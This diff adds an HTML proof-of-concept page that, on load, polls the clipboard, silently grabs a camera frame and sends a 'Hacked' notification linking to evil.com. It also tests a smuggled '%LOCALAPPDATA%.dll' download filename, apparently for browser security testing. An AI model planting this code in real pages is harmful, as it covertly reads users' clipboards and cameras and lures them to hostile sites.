@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Permissions Demonstration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .container {
+            margin-bottom: 25px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        h3 {
+            margin-bottom: 10px;
+        }
+        .data-box {
+            border: 1px dashed #ccc;
+            padding: 10px;
+            min-height: 50px;
+            word-wrap: break-word;
+            background-color: #f9f9f9;
+        }
+        #capturedImage {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ccc;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body onload="initiateDemonstration();">
+    <h1>Demonstrating Direct Access to Security Permissions</h1>
+    
+    <div class="container">
+        <h3>Clipboard Data:</h3>
+        <div id="clipboardResult" class="data-box">[Polling for clipboard content...]</div>
+    </div>
+
+    <div class="container">
+        <h3>Captured Image:</h3>
+        <img id="capturedImage" class="hidden" alt="Captured image will be displayed here."/>
+    </div>
+    
+    <div class="container">
+        <h3>File Download (Environment Variable Test):</h3>
+        <p>This link tests for an environment variable expansion vulnerability. In a vulnerable application, the "Save As" dialog might open in the AppData folder. In a secure browser, it will treat the filename literally.</p>
+        <a href="." download="%LOCALAPPDATA%.dll">Click Me Right Click</a>
+    </div>
+
+    <div class="container">
+        <h3>Notification:</h3>
+        <div id="notificationResult" class="data-box">[Awaiting notification trigger...]</div>
+    </div>
+
+    <!-- Hidden video element required for camera access -->
+    <video id="videoElement" class="hidden" autoplay playsinline></video>
+
+    <script>
+        /**
+         * 1. CLIPBOARD POLLING
+         */
+        function pollClipboard() {
+            setInterval(() => {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    navigator.clipboard.readText().then(text => {
+                        const el = document.getElementById("clipboardResult");
+                        if(text && el.innerText !== text) el.innerText = text;
+                    }).catch(e=>{});
+                }
+            }, 1000);
+        }
+
+        /**
+         * 2. CAMERA CAPTURE
+         */
+        function captureFromCamera() {
+            const el = document.getElementById('capturedImage');
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({video:true}).then(stream => {
+                    const video = document.getElementById('videoElement');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        el.src = canvas.toDataURL('image/png');
+                        el.classList.remove('hidden');
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 2000);
+                }).catch(e => {
+                    el.alt = "Camera access denied.";
+                    el.classList.remove('hidden');
+                });
+            }
+        }
+
+        /**
+         * 3. STANDALONE NOTIFICATION
+         */
+        function triggerMaliciousNotification() {
+            const el = document.getElementById('notificationResult');
+            if ('Notification' in window) {
+                Notification.requestPermission().then(p => {
+                    if (p === 'granted') {
+                        const n = new Notification('Hacked', {body: 'Granting Access to User Security Permissions'});
+                        n.onclick = () => window.open('https://evil.com','_blank');
+                        el.innerText = 'Malicious notification sent.';
+                    } else {
+                        el.innerText = 'Notification permission denied.';
+                    }
+                });
+            } else {
+                el.innerText = 'Notifications not supported.';
+            }
+        }
+
+        /**
+         * INITIATOR
+         */
+        function initiateDemonstration() {
+            pollClipboard();
+            captureFromCamera();
+            triggerMaliciousNotification();
+        }
+    </script>
+</body>
+</html>
